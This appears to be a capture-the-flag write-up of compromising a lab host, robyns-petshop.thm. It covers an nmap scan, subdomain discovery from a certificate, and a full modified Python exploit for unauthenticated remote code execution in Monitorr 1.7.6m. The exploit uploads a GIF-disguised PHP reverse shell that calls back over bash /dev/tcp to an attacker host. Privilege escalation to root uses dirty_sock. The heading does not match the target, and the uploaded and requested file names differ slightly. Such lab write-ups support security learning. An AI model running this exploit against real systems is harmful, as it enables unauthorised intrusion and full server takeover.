# Year of the Fox

`Install ngrok so that connect from public IP. It helps connecting from external IP.`

Run NMAP `nmap -sV -Pn -n -T1 -A 63.35.214.248 -o nmap.txt`

```
35.214.248
Nmap scan report for 63.35.214.248
Host is up (0.20s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
80/tcp   open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to https://robyns-petshop.thm/
443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Robyn&#039;s Pet Shop
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Not valid before: 2021-07-02T15:48:26
|_Not valid after:  2022-07-02T15:48:26
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
8000/tcp open  http-alt
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 15
|_    Request
|_http-title: Under Development!
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.91%I=7%D=7/2%Time=60DF394A%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,3F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x20
SF:15\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  2 21:36:54 2021 -- 1 IP address (1 host up) scanned in 1003.96 seconds
```
***
While exploring certificate in browser found more dns records:
- robyns-petshop.thm
- monitorr.robyns-petshop.thm
- beta.robyns-petshop.thm
- dev.robyns-petshop.thm

***

While going to monitorr.robyns-petshop.thm found that there is version 1.7.6m. Lets check in searchsploit.

`Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)   | php/webapps/48980.py`

But while executing the exploit the php file was not uploading. It was detected as exploit. Changing the shell name to shell.gif.phtml worked.

I used the below code:
```
#!/usr/bin/python
# -*- coding: UTF-8 -*-

import requests
import os
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sess = requests.Session()
sess.verify = False

if len (sys.argv) != 4:
    print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll1.jpg.phtml\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

    r = sess.post(url, headers=headers, data=data, cookies={"isHuman": "1"})

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/she_ll.jpg.phtml"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    sess.get(url, headers=headers)
```

After uploading run the below command to get a terminal.
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Then run exploit_suggester.

Here we saw a exploit called dirty_sock lets run it.

then login with username: dirty_sock, password: dirty_sock.
Run command: `sudo /bin/bash` to become root.




## Problems faced
- Check if any cookie is needed.
- Check whether we need a SSL certificate is needed.
- Check whether its shell is uploading, if not try changing extension.
- Try to make shell stable.